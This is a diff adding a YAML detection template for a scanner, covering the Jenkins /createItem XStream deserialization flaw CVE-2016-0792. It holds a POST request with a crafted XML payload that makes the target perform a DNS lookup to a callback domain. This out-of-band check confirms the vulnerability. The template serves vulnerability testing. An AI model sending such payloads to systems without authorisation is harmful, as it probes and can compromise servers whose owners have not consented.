@@ -1,0 +1,23 @@
+id: poc-yaml-jenkins-createItem-xstream-rce
+info:
+  name: Jenkins /createItem 反序列化代码执行漏洞（CVE-2016-0792）
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 反序列化
+  - CVE-2016-0792
+  finger: Jenkins
+  fofa: null
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /createItem?name=foo
+  headers:
+    Content-Type: text/xml
+  data: "<map>\n <entry>\n  <url>http://{{.reverseDomain}}</url>\n  <int>1</int>\n\
+    \ </entry>\n</map>"
+  expression: "status_code == 500 && \nreverse.Verify()\n"
+transport: http
